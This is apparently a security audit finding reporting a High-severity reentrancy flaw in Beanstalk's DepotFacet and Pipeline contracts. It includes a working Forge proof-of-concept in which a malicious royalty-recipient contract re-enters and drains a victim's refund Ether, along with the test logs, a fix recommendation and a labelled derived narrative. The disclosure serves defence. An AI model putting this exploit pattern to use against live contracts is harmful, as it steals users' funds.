---
id: 19226
severity: "High"
---

# Intermediate value sent by the caller can be drained via reentrancy when `Pipeline` execution is handed off to an untrusted external contract

## Description

** Pipeline is a utility contract created by the Beanstalk Farms team that enables the execution of an arbitrary number of valid actions in a single transaction. The `DepotFacet` is a wrapper around Pipeline for use within the Beanstalk Diamond proxy. When utilizing Pipeline through the `DepotFacet`, Ether value is first loaded by a payable call to the Diamond proxy fallback function, which then delegates execution to the logic of the respective facet function. Once the [`DepotFacet::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L55-L62) is called, for example, value is forwarded on to a [function of the same name](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L57-L66) within Pipeline.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes, uint256 value)
    external
    payable
    returns (bytes[] memory results)
{
    results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);
    LibEth.refundEth();
}
```

The important point to note here is that rather than sending the full Ether amount received by the Diamond proxy, the amount sent to Pipeline is equal to that of the `value` argument above, necessitating the use of [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), which itself transfers the entire proxy Ether balance to the caller, following the call to return any unspent Ether.

```solidity
function refundEth()
    internal
{
    AppStorage storage s = LibAppStorage.diamondStorage();
    if (address(this).balance > 0 && s.isFarm != 2) {
        (bool success, ) = msg.sender.call{value: address(this).balance}(
            new bytes(0)
        );
        require(success, "Eth transfer Failed.");
    }
}
```

This logic appears to be correct and work as intended; however, issues can arise due to the lack of reentrancy guard on `DepotFacet` and `Pipeline` functions. Given the nature of Pipeline calls to potentially untrusted external contracts, which themselves may also hand off execution to their own set of untrusted external contracts, this can become an issue if a malicious contract calls back into Beanstalk and/or Pipeline.

```solidity
function advancedPipe(AdvancedPipeCall[] calldata pipes)
    external
    payable
    override
    returns (bytes[] memory results) {
        results = new bytes[](pipes.length);
        for (uint256 i = 0; i < pipes.length; ++i) {
            results[i] = _advancedPipe(pipes[i], results);
        }
    }
```

Continuing with the example of `DepotFacet::advancedPipe`, say, for example, one of the pipe calls involves an NFT mint/transfer in which some external contract is paid royalties in the form of a low-level call with ETH attached or some safe transfer check hands-off execution in this way, the malicious recipient could initiate a call to the Beanstalk Diamond which once again triggers `DepotFacet::advancedPipe` but this time with an empty `pipes` array. Given the implementation of `Pipeline::advancedPipe` above, this will simply return an empty bytes array and fall straight through to the ETH refund. Since the proxy balance is non-zero, assuming `value != msg.value` in the original call, this `msg.value - value` difference will be transferred to the malicious caller. Once execution returns to the original context and the original caller's transaction is nearing completion, the contract will no longer have any excess ETH, even though it is the original caller who should have received a refund of unspent funds.

This finding also applies to `Pipeline` itself, in which a malicious contract can similarly reenter Pipeline and utilize intermediate Ether balance without sending any value of their own. For example, given `getEthValue` does not validate the [clipboard value](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L95C17-L95C22) against the payable value (likely due to its current usage within a loop), `Pipeline::advancedPipe` could be called with a single `AdvancedPipeCall` with [normal pipe encoding](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L99) which calls another address owned by the attacker, again forwarding all remaining Ether given they are able to control the `value` parameter. It is, of course, feasible that the original caller attempts to perform some other more complicated pipes following the first, which may revert with 'out of funds' errors, causing the entire advanced pipe call to fail if no tolerant mode behavior is implemented on the target contract, so the exploiter would need to be strategic in these scenarios if they wish to elevate they exploit from denial-of-service to the stealing of funds.

** A malicious external contract handed control of execution during the lifetime of a Pipeline call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.

## Proof of Concept

** The following forge test demonstrates the ability of an NFT royalty recipient, for example, to re-enter both Beanstalk and Pipeline, draining funds remaining in the Diamond and Pipeline that should have been refunded to/utilized by the original caller at the end of execution:

```solidity
contract DepotFacetPoC is Test {
    RoyaltyRecipient exploiter;
    address exploiter1;
    DummyNFT dummyNFT;
    address victim;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK);

        exploiter = new RoyaltyRecipient();
        dummyNFT = new DummyNFT(address(exploiter));
        victim = makeAddr("victim");
        vm.deal(victim, 10 ether);

        exploiter1 = makeAddr("exploiter1");
        console.log("exploiter1: ", exploiter1);

        address _pipeline = address(new Pipeline());
        vm.etch(PIPELINE, _pipeline.code);

        vm.label(BEANSTALK, "Beanstalk Diamond");
        vm.label(address(dummyNFT), "DummyNFT");
        vm.label(address(exploiter), "Exploiter");
    }

    function test_attack() public {
        emit log_named_uint("Victim balance before: ", victim.balance);
        emit log_named_uint("BEANSTALK balance before: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance before: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance before: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance before: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance before: ", exploiter1.balance);

        vm.startPrank(victim);
        AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
        pipes[0] = AdvancedPipeCall(address(dummyNFT), abi.encodePacked(dummyNFT.mintNFT.selector), abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(1 ether)));
        IBeanstalk(BEANSTALK).advancedPipe{value: 10 ether}(pipes, 4 ether);
        vm.stopPrank();

        emit log_named_uint("Victim balance after: ", victim.balance);
        emit log_named_uint("BEANSTALK balance after: ", BEANSTALK.balance);
        emit log_named_uint("PIPELINE balance after: ", PIPELINE.balance);
        emit log_named_uint("DummyNFT balance after: ", address(dummyNFT).balance);
        emit log_named_uint("Exploiter balance after: ", address(exploiter).balance);
        emit log_named_uint("Exploiter1 balance after: ", exploiter1.balance);
    }
}

contract DummyNFT {
    address immutable i_royaltyRecipient;
    constructor(address royaltyRecipient) {
        i_royaltyRecipient = royaltyRecipient;
    }

    function mintNFT() external payable returns (bool success) {
        // imaginary mint/transfer logic
        console.log("minting/transferring NFT");
        // console.log("msg.value: ", msg.value);

        // send royalties
        uint256 value = msg.value / 10;
        console.log("sending royalties");
        (success, ) = payable(i_royaltyRecipient).call{value: value}("");
    }
}

contract RoyaltyRecipient {
    bool exploited;
    address constant exploiter1 = 0xDE47CfF686C37d501AF50c705a81a48E16606F08;

    fallback() external payable {
        console.log("entered exploiter fallback");
        console.log("Beanstalk balance: ", BEANSTALK.balance);
        console.log("Pipeline balance: ", PIPELINE.balance);
        console.log("Exploiter balance: ", address(this).balance);
        if (!exploited) {
            exploited = true;
            console.log("exploiting depot facet advanced pipe");
            IBeanstalk(BEANSTALK).advancedPipe(new AdvancedPipeCall[](0), 0);
            console.log("exploiting pipeline advanced pipe");
            AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);
            pipes[0] = AdvancedPipeCall(address(exploiter1), "", abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(PIPELINE.balance)));
            IPipeline(PIPELINE).advancedPipe(pipes);
        }
    }
}
```
As can be seen in the output below, the exploiter is able to net 9 additional Ether at the expense of the victim:
```
Running 1 test for test/DepotFacetPoC.t.sol:DepotFacetPoC
[PASS] test_attack() (gas: 182190)
Logs:
  exploiter1:  0xDE47CfF686C37d501AF50c705a81a48E16606F08
  Victim balance before: : 10000000000000000000
  BEANSTALK balance before: : 0
  PIPELINE balance before: : 0
  DummyNFT balance before: : 0
  Exploiter balance before: : 0
  Exploiter1 balance before: : 0
  entered pipeline advanced pipe
  msg.value:  4000000000000000000
  minting/transferring NFT
  sending royalties
  entered exploiter fallback
  Beanstalk balance:  6000000000000000000
  Pipeline balance:  3000000000000000000
  Exploiter balance:  100000000000000000
  exploiting depot facet advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  entered exploiter fallback
  Beanstalk balance:  0
  Pipeline balance:  3000000000000000000
  Exploiter balance:  6100000000000000000
  exploiting pipeline advanced pipe
  entered pipeline advanced pipe
  msg.value:  0
  Victim balance after: : 0
  BEANSTALK balance after: : 0
  PIPELINE balance after: : 0
  DummyNFT balance after: : 900000000000000000
  Exploiter balance after: : 6100000000000000000
  Exploiter1 balance after: : 3000000000000000000
```

## Recommendation

** Add reentrancy guards to both the `DepotFacet` and `Pipeline`. Also, consider validating clipboard Ether values in `Pipeline::_advancedPipe` against the payable function value in `Pipeline::advancedPipe`.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a reentrancy flaw that appears when the Beanstalk Diamond proxy forwards a payable call to the DepotFacet, which in turn forwards a user‑specified Ether amount to the Pipeline contract. The contract uses a helper function that refunds any remaining Ether by sending the entire balance of the proxy to msg.sender after the pipeline execution finishes. Because neither DepotFacet nor Pipeline is protected by a reentrancy guard, a malicious external contract that receives Ether during a pipeline step can invoke a second call back into the Diamond (or directly into Pipeline) before the original refund is performed. By calling advancedPipe with an empty pipe array and a value of zero, the attacker triggers the refund logic while the proxy still holds the unspent Ether that originated from the original caller. The refund then transfers this intermediate balance to the attacker instead of returning it to the legitimate user. The root cause is the combination of (1) missing non‑reentrant protection on the functions that handle external calls, (2) the refundEth routine that blindly forwards the whole contract balance, and (3) the lack of validation that the intermediate Ether value matches the amount originally supplied. The exploit can be carried out by any contract that receives royalties or other Ether payments inside a pipeline step, because the fallback can re‑enter the system and drain the leftover funds. From a user’s perspective the expected outcome – a refund of the unused portion of their sent Ether – does not happen; instead the user’s balance may become zero and the funds seemingly disappear. The issue manifests whenever a caller supplies a value argument that is smaller than msg.value and the pipeline invokes an untrusted external contract that can execute a callback. All participants who rely on the advancedPipe interface – regular users, the Beanstalk protocol, and any downstream contracts – are affected because the protocol can lose Ether and the accounting assumptions about refunds are broken. The flaw was discovered during a security audit by Cyfrin and reproduced with a Forge test that demonstrated a royalty‑receiving NFT contract re‑entering both DepotFacet and Pipeline to siphon Ether. The problem is subtle because the refund occurs at the end of execution and the contract’s balance is cleared, leaving no obvious error flag. To remediate the issue the contracts should be hardened with a reentrancy guard (e.g., OpenZeppelin’s nonReentrant modifier) on both DepotFacet and Pipeline functions, and the refund logic should be rewritten to transfer only the explicitly unspent amount after verifying that no re‑entrant calls have altered the balance. Additionally, the internal clipboard Ether values used by Pipeline should be validated against the payable amount supplied to advancedPipe, ensuring that intermediate balances cannot be abused. Implementing these safeguards restores the intended business logic that users receive a correct refund and prevents malicious contracts from draining intermediate Ether.
